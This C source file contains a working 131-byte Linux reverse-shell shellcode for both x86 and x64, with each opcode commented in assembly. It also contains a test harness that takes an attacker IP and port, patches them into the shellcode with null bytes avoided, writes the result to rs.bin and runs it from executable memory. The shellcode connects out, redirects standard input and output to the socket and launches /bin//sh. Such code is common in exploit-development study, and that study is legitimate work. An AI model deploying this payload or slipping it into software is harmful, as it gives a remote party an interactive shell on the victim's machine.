
/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/mman.h>

#define RS_SIZE 131

char RS[] = {
  /* 0000 */ "\xb9\xfd\xff\xfb\x2d"         /* mov ecx, 0x2dfbfffd             */
  /* 0005 */ "\xba\x80\xff\xff\xfe"         /* mov edx, 0xfeffff80             */
  /* 000A */ "\xf7\xd1"                     /* not ecx                         */
  /* 000C */ "\xf7\xd2"                     /* not edx                         */
  /* 000E */ "\x50"                         /* push rax                        */
  /* 000F */ "\x50"                         /* push rax                        */
  /* 0010 */ "\x89\x0c\x24"                 /* mov [rsp], ecx                  */
  /* 0013 */ "\x89\x54\x24\x04"             /* mov [rsp+0x4], edx              */
  /* 0017 */ "\x54"                         /* push rsp                        */
  /* 0018 */ "\x5d"                         /* pop rbp                         */
  /* 0019 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 001B */ "\x99"                         /* cdq                             */
  /* 001C */ "\xb0\x67"                     /* mov al, 0x67                    */
  /* 001E */ "\x6a\x01"                     /* push 0x1                        */
  /* 0020 */ "\x5e"                         /* pop rsi                         */
  /* 0021 */ "\x6a\x02"                     /* push 0x2                        */
  /* 0023 */ "\x5f"                         /* pop rdi                         */
  /* 0024 */ "\x48\x75\x19"                 /* jnz 0x40                        */
  /* 0027 */ "\xb0\x29"                     /* mov al, 0x29                    */
  /* 0029 */ "\x0f\x05"                     /* syscall                         */
  /* 002B */ "\x97"                         /* xchg edi, eax                   */
  /* 002C */ "\x96"                         /* xchg esi, eax                   */
  /* 002D */ "\xb0\x21"                     /* mov al, 0x21                    */
  /* 002F */ "\x0f\x05"                     /* syscall                         */
  /* 0031 */ "\x83\xee\x01"                 /* sub esi, 0x1                    */
  /* 0034 */ "\x79\xf7"                     /* jns 0x2d                        */
  /* 0036 */ "\x55"                         /* push rbp                        */
  /* 0037 */ "\x5e"                         /* pop rsi                         */
  /* 0038 */ "\xb2\x10"                     /* mov dl, 0x10                    */
  /* 003A */ "\xb0\x2a"                     /* mov al, 0x2a                    */
  /* 003C */ "\x0f\x05"                     /* syscall                         */
  /* 003E */ "\xeb\x1f"                     /* jmp 0x5f                        */
  /* 0040 */ "\x56"                         /* push rsi                        */
  /* 0041 */ "\x5b"                         /* pop rbx                         */
  /* 0042 */ "\x52"                         /* push rdx                        */
  /* 0043 */ "\x53"                         /* push rbx                        */
  /* 0044 */ "\x57"                         /* push rdi                        */
  /* 0045 */ "\x54"                         /* push rsp                        */
  /* 0046 */ "\x59"                         /* pop rcx                         */
  /* 0047 */ "\xcd\x80"                     /* int 0x80                        */
  /* 0049 */ "\x93"                         /* xchg ebx, eax                   */
  /* 004A */ "\x59"                         /* pop rcx                         */
  /* 004B */ "\xb0\x3f"                     /* mov al, 0x3f                    */
  /* 004D */ "\xcd\x80"                     /* int 0x80                        */
  /* 004F */ "\x49\x79\xf9"                 /* jns 0x4b                        */
  /* 0052 */ "\x6a\x10"                     /* push 0x10                       */
  /* 0054 */ "\x55"                         /* push rbp                        */
  /* 0055 */ "\x53"                         /* push rbx                        */
  /* 0056 */ "\x54"                         /* push rsp                        */
  /* 0057 */ "\x59"                         /* pop rcx                         */
  /* 0058 */ "\x6a\x03"                     /* push 0x3                        */
  /* 005A */ "\x5b"                         /* pop rbx                         */
  /* 005B */ "\xb0\x66"                     /* mov al, 0x66                    */
  /* 005D */ "\xcd\x80"                     /* int 0x80                        */
  /* 005F */ "\x99"                         /* cdq                             */
  /* 0060 */ "\x31\xf6"                     /* xor esi, esi                    */
  /* 0062 */ "\x50"                         /* push rax                        */
  /* 0063 */ "\x50"                         /* push rax                        */
  /* 0064 */ "\x50"                         /* push rax                        */
  /* 0065 */ "\x54"                         /* push rsp                        */
  /* 0066 */ "\x5b"                         /* pop rbx                         */
  /* 0067 */ "\x53"                         /* push rbx                        */
  /* 0068 */ "\x5f"                         /* pop rdi                         */
  /* 0069 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
  /* 006F */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
  /* 0076 */ "\x40\x75\x04"                 /* jnz 0x7d                        */
  /* 0079 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
  /* 007B */ "\x0f\x05"                     /* syscall                         */
  /* 007D */ "\x31\xc9"                     /* xor ecx, ecx                    */
  /* 007F */ "\xb0\x0b"                     /* mov al, 0xb                     */
  /* 0081 */ "\xcd\x80"                     /* int 0x80                        */
};

void bin2file(void *p, int len)
{
  FILE *out = fopen("rs.bin", "wb");
  if (out!= NULL)
  {
    fwrite(p, len, 1, out);
    fclose(out);
  }
}

void xcode(char *s, int len, uint32_t ip, int16_t port)
{
  uint8_t *p;
  
  p=(uint8_t*)mmap (0, len, 
      PROT_EXEC | PROT_WRITE | PROT_READ, 
      MAP_ANON  | MAP_PRIVATE, -1, 0);  

  fprintf (stdout, "\n%08lX - %02X", ip, port);
  fflush(stdout);
  
  memcpy(p, s, len);
  memcpy((void*)&p[3], &port, 2); // set the port  
  memcpy((void*)&p[6], &ip, 4);     // set the ip
  
  bin2file(p, len);
  
  // execute
  ((void(*)())p)();
    
  munmap ((void*)p, len);  
}

int main(int argc, char *argv[])
{
  uint32_t ip   = 0;
  int16_t  port = 0;
  
  if (argc!=3) {
    printf ("\nrs_test <ip> <port>\n");
    return 0;
  }
  ip   = inet_addr(argv[1]);
  port = atoi(argv[2]);
  
  if (port<0 || port>65535) {
    printf ("\ninvalid port specified");
  }
  // invert both to hide any null bytes.
  // there's no rigorous checking here obviously
  ip =~ip;
  port = ~port;
  
  xcode (RS, RS_SIZE, ip, port);
  return 0;  
}

